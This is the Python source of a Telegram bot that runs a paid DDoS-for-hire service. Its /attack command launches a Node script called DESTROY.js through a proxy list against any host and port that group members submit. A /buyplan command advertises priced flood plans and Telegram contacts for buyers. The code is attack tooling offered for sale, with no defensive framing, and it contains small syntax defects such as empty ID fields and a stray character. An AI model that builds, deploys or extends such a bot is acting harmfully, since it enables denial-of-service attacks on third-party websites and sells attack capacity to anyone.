import telebot
import threading
import subprocess
import time
import psutil
from datetime import datetime
import json
import pytz
import requests
import random
import urllib.parse
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

API_TOKEN = ''

bot = telebot.TeleBot(API_TOKEN)

admin_id = {, }
group_id = 
is_bot_active = True
cooldown_dict = {}
count = 1
COOLDOWN_SECONDS = 300 

def get_vietnamese_time():
    tz = pytz.timezone('Asia/Ho_Chi_Minh')
    return datetime.now(tz).strftime('%d/%m/%Y %H:%M:%S')

# thả cảm xúc
emoji_list = ['👍', '❤️', '👾', '😇', '🫡', '🤡', '👌', '👾']

def tha_camxuc(chat_id, message_id, emoji):
    url = f"https://api.telegram.org/bot{API_TOKEN}/setMessageReaction"
    data = {
        'chat_id': chat_id,
        'message_id': message_id,
        'reaction': json.dumps([{'type': 'emoji', 'emoji': emoji}])
    }
    response = requests.post(url, data=data)
    return response.json()

def run_attack(command, duration, message):
    try:
        cmd_process = subprocess.Popen(command)
        start_time = time.time()

        while cmd_process.poll() is None:
            if psutil.cpu_percent(interval=1) >= 80:  # More reasonable threshold
                time_passed = time.time() - start_time
                if time_passed >= 90:
                    cmd_process.terminate()
                    bot.reply_to(message, "Attack Command Stopped, Thank You For Using.")
                    return
            if time.time() - start_time >= duration:
                cmd_process.terminate()
                cmd_process.wait()
                return
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def is_valid_group(message):
    if message.chat.id != group_id:
        bot.reply_to(message, 'Bot only works in this group https://t.me/giangalus')
        return False
    return True
t
def validate_attack_format(args):
    if len(args) != 4:
        return False
    try:
        int(args[3])
        return True
    except ValueError:
        return False

@bot.message_handler(commands=['attack'])
def attack_command(message):
    global count
    user_id = message.from_user.id
    username = message.from_user.username
    user = message.from_user
    user_mention = user.first_name
    chat_id = message.chat.id
    message_id = message.message_id
    user_link = f'<a href="tg://user?id={user.id}">{user_mention}</a>'
    random_emoji = random.choice(emoji_list)
    result = tha_camxuc(chat_id, message_id, random_emoji) 

    if not is_valid_group(message):
        return

    if not is_bot_active:
        bot.reply_to(message, 'Bot is currently disabled. Please wait until it is enabled again.')
        return

    # Cooldown check
    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id]['attack'] < COOLDOWN_SECONDS:
        remaining_time = COOLDOWN_SECONDS - (time.time() - cooldown_dict[user_id]['attack'])
        bot.reply_to(message, f'You must wait {int(remaining_time)} seconds to use the command again.')
        return

    args = message.text.split()
    
    if not validate_attack_format(args):
        bot.reply_to(message, 'Invalid format.\nPlease enter correctly: /attack [host] [port] [time]')
        return

    host = args[1]
    port = args[2]
    duration = int(args[3])
    
    if "https://" in host and port == '80':
        bot.reply_to(message, "Port 80 is only used for HTTP websites!")
        return
    elif "http://" in host and port == '443':
        bot.reply_to(message, "Port 443 is only used for HTTPS websites!")
        return

    if port == '443':
        protocol = 'HTTPS'
    elif port == '80':
        protocol = 'HTTP'
    else:
        bot.reply_to(message, "The only allowed ports are 443 for HTTPS, 80 for HTTP.")
        return

    blocked_domains = ["doamin_backlist"]   
    for blocked_domain in blocked_domains:
        if blocked_domain in host:
            bot.reply_to(message, '<pre>😢 Domain name is in Blacklist</pre>', parse_mode='html')
            return

    command = ["node", "DESTROY.js", host, str(duration), port, "2", "proxy.txt"]
    
    cooldown_dict[user_id] = {'attack': time.time()}

    attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
    attack_thread.start()

    vietnamese_time = get_vietnamese_time()

    button_text_1 = "Check Host 🔎"
    check_host_url = f"https://check-host.net/check-http?host={urllib.parse.quote(host)}"
    
    button_text_2 = "Price C2/API"
    price_url = "https://t.me/giangalus"

    inline_keyboard = InlineKeyboardMarkup()
    inline_button_1 = InlineKeyboardButton(text=button_text_1, url=check_host_url)
    inline_button_2 = InlineKeyboardButton(text=button_text_2, url=price_url)
    inline_keyboard.add(inline_button_1, inline_button_2)

    count_message = f'{count}/1'
    count = (count % 5) + 1  

    message_text = (f'\n   🚨 Attack Sent!! 🚨\n\n<b>Use By</b>: {user_link} \n<b>Target</b>: {host}\n'
                    f'<b>Port</b>: {port} \n<b>Duration</b>: {duration} seconds\n<b>Time</b>: {vietnamese_time}\n'
                    f'<b>Count</b>: {count_message}\n')

    bot.send_message(message.chat.id, message_text, parse_mode='html', reply_markup=inline_keyboard)

@bot.message_handler(commands=['go'])
def start_command(message):
    if not is_valid_group(message):
        return

    user_id = message.from_user.id
    username = message.from_user.username
    user = message.from_user
    user_mention = user.first_name
    user_link = f'<a href="tg://user?id={user.id}">{user_mention}</a>'
    welcome_message = (f'''
Hello, {user_link} 👋

   | Here is a list of all available commands

    •/go - Wake up the bot
    •/attack - Attack the website
    •/buyplan - Buy C2 DDoS plan

⚠️ Warning: if you want to use premium functions, you need to buy a plan. If you want to help or buy access, you can message: @giangalus
        ''')

    bot.reply_to(message, welcome_message, parse_mode='html')

@bot.message_handler(commands=['buyplan'])
def muaplan_command(message):
    if not is_valid_group(message):
        return

    user_id = message.from_user.id
    username = message.from_user.username
    user = message.from_user
    user_mention = user.first_name
    user_link = f'<a href="tg://user?id={user.id}">{user_mention}</a>'
    button_text = "Buy Plan Now 💳"
    button_url = "t.me/fluyd_cnc" 

    inline_keyboard = InlineKeyboardMarkup()
    inline_button = InlineKeyboardButton(text=button_text, url=button_url)
    inline_keyboard.add(inline_button)

    message_text = (f'''
Hello {user_link} 👋

If you want to buy C2 Bot DDoS plan, please message the bot owner directly by clicking <b>"Buy Plan Now 💳"</b> below

Price List 💸
3$ / 2 Weeks - DDoS 15,000 Mbps
5$ / 1 Month - DDoS 30,000 Mbps
10$ / 3 Months - DDoS 100,000 Mbps
        ''')

    bot.send_message(message.chat.id, message_text, parse_mode='html', reply_markup=inline_keyboard)

bot.polling()
